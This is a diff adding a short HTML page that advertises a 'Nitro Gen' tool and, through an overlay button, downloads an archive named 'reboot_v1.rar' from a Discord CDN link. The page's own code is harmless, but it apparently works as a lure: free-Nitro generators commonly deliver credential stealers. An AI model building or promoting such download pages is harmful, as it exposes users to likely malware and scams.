@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloads</title>
+    <style>
+        body {
+            background-color: #111111;
+            margin: 0;
+            height: 100vh;
+            position: relative;
+            font-family: Arial, sans-serif;
+        }
+        .top-left-box {
+            width: 200px;
+            height: 200px;
+            background-color: transparent;
+            border: 2px solid purple;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.3s ease;
+        }
+        .top-left-box:hover {
+            transform: scale(1.1);
+            border-color: #DDA0DD;
+        }
+        .top-left-box:hover .box-text {
+            transform: scale(1.1);
+        }
+        .box-text {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        /* Overlay styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* semi-transparent black */
+            backdrop-filter: blur(5px); /* Apply blur effect */
+            display: none; /* Initially hidden */
+            z-index: 999; /* Ensure it's above other content */
+            text-align: center;
+        }
+        .overlay-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: white;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+            color: white;
+            font-size: 24px;
+            z-index: 1000; /* Ensure it's above the blur effect */
+        }
+        .overlay-text {
+            font-weight: bold;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .download-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #171717;
+            color: white;
+            border: 2px solid purple;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+        .download-btn:hover {
+            transform: scale(1.1);
+            border-color: #DDA0DD;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-left-box" onclick="showOverlay()">
+        <div class="box-text">Nitro Gen</div>
+    </div>
+    
+    <!-- Overlay -->
+    <div class="overlay" id="overlay">
+        <span class="close-btn" onclick="hideOverlay()">X</span>
+        <div class="overlay-content">
+            <div class="overlay-text">Download Nitro Gen Here</div>
+            <button class="download-btn" onclick="downloadFile()">Download</button>
+        </div>
+    </div>
+
+    <script>
+        function showOverlay() {
+            var overlay = document.getElementById("overlay");
+            overlay.style.display = "block";
+        }
+
+        function hideOverlay() {
+            var overlay = document.getElementById("overlay");
+            overlay.style.display = "none";
+        }
+
+        function downloadFile() {
+            // Create an anchor element
+            var link = document.createElement('a');
+            link.href = "https://cdn.discordapp.com/attachments/1249249656056053823/1249885222129107075/reboot_v1.rar?ex=6668edd2&is=66679c52&hm=56efaf2dc9c1f8e092b0c52c80dfe18947162950e8fcc4cfea1825a1ae88e7f4";
+            // Set the download attribute and filename
+            link.download = "reboot_v1.rar";
+            // Programmatically trigger a click event to download the file
+            link.click();
+        }
+    </script>
+</body>
+</html>
